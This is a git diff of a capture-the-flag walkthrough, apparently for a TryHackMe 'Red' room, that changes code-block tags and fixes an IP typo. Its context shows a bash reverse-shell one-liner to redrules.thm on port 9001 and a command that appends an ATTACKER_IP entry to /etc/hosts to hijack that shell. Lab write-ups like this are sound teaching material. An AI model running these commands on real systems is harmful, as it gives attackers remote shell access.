@@ -163,7 +163,7 @@ After a bit of analysis using `linpeas` and `pspy` (or alternatively you can jus
 
 1. The `/etc/hosts` file has an entry and we can only _amend_ to it:
 
-```hosts
+```plaintext
 127.0.0.1 localhost
 127.0.1.1 red
 192.168.0.1 redrules.thm
@@ -178,11 +178,11 @@ ff02::2 ip6-allrouter
 
 2. There's a persistently run process:
 
-```process
+```shell
 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 ```
 
-_But_ the IP 19.168.0.1 doesn't actually lead anywhere. So we can just add an entry for `redrules.thm` to `/etc/hosts` that leads to our machine and start a listener to obtain a reverse shell as red:
+_But_ the IP 192.168.0.1 doesn't actually lead anywhere. So we can just add an entry for `redrules.thm` to `/etc/hosts` that leads to our machine and start a listener to obtain a reverse shell as red:
 ```shell-session
 ## On target:
 $ echo "ATTACKER_IP redrules.thm" >> /etc/hosts
